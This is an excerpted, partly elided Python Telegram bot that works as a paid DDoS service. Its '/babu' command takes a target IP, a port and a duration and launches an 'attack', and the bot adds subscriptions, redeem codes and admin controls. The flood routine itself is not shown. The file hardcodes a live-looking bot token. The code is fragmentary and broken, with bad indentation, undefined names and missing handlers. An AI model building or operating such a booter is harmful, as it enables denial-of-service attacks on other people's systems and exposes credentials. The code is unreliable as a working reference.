...
TELEGRAM_BOT_TOKEN = '7618343172:AAHfH1LMtfmYK6Of7S6wzwWzZdr6mzBtktE'
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        help_text = (
            ...
            "*🔸 /babu* - Trigger an babu operation.\n"
        ...
        help_text = (
            "*💡 Available Commands for Admins:*\n\n"
             ...
             "🔸 /subscribe - Subscribe to our service\n"
             "🔸 /unsubscribe - Unsubscribe from our service\n\n"
            "*🔸 /babu* - Start the babu.\n"
            "*🔸 /get_id* - Get user id.\n"
...
def get_status(user_subscription, user_id, username):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")
    
    if user_subscription['active']:
        active_inactive = "ACTIVE"
        expires = user_subscription['expiration'].strftime("%Y-%m-%d %H:%M:%S IST")
    else:
    ...
    return status_message, reply_markup
...
async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id in user_subscriptions:
        ...
        user_subscription = user_subscriptions[user_id]
        status_message, reply_markup = get_status(user_subscription, user_id, username)
        await update.message.reply_text(status_message, reply_markup=reply_markup)
    else:
        user_subscriptions[user_id] = {
            'active': True,
            'expiration': datetime.now()  # Set expiration however you like
        }
        await update.message.reply_text("🎉 You have successfully subscribed! You will now receive updates.")
        user_subscription = user_subscriptions[user_id]
        status_message, reply_markup = get_status(user_subscription, user_id, username)
        await update.message.reply_text(status_message, reply_markup=reply_markup)
...
async def unsubscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id in user_subscriptions:
        ...
        await update.message.reply_text("✅ You have been successfully unsubscribed!")
    else:
        await update.message.reply_text("❌ You are not subscribed to any services.")

async def admin_add_subscribe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(context.args[0])  # Get user ID from command arguments
    username = context.args[1] if len(context.args) > 1 else 'Unknown'  # Get username if provided

    if update.message.from_user.id == admin_id:  # Only allow admin to run this command
        if user_id not in user_subscriptions:
            user_subscriptions[user_id] = {
                'active': True,
                'expiration': datetime.now()  # Set an appropriate expiration
            }
            await update.message.reply_text(f"🎉 Successfully subscribed @{username}!")
        else:
            await update.message.reply_text(f"✅ User @{username} is already subscribed!")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command.")

async def admin_remove_subscribe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(context.args[0])  # Get user ID from command arguments

    if update.message.from_user.id == admin_id:  # Only allow admin to run this command
        if user_id in user_subscriptions:
            del user_subscriptions[user_id]
            await update.message.reply_text("✅ Successfully unsubscribed user!")
        else:
            await update.message.reply_text("❌ User is not subscribed to any services.")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command.")

# Example usage:
# Make sure to register subscribe_command, unsubscribe_command,
# admin_add_subscribe and admin_remove_subscribe in your command handlers.
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*📝 𝗨𝘀𝗮𝗴𝗲: /babu <target> <port> <time>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /babu 1.1.1.1 80 120\n\n⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:\n• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀*", parse_mode='Markdown')
        return
...
message = (
    ...
    f"*🔌 𝗣𝗼𝗿𝘁 :- {port}*\n"
    f"*⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 :- {time}*\n"
    f"*📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 :- {current_time} IST*\n\n"
    f"*⚡️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...*"
)

# New format message to include
message_new_format = (
    f"🚀 𝗔𝗧𝗧𝗔𝗖𝗸 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!\n\n"
    f"🚀 𝗨𝘀𝗲𝗿 :- @{username}\n"
    f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁 :- {ip}\n"
...
# Combine the messages if needed or choose one to send
await context.bot.send_message(
    chat_id=chat_id,
    text=message,  # or use message_new_format if you prefer
    parse_mode='Markdown'
)
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
async def papa_bol(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
    message = f"APKI ID BRO: `{user_id}`" 
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝗧𝗛𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗗 ✅\n\n📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {current_time} IST*", parse_mode='Markdown')
...
async def redeem_code(update: Update, context: CallbackContext):
    ...
    chat_id=chat_id,
    text=(
        "*✅ Redeem code successfully applied!*\n"
...
def main():
    ...
    application.add_handler(CommandHandler("babu", babu))
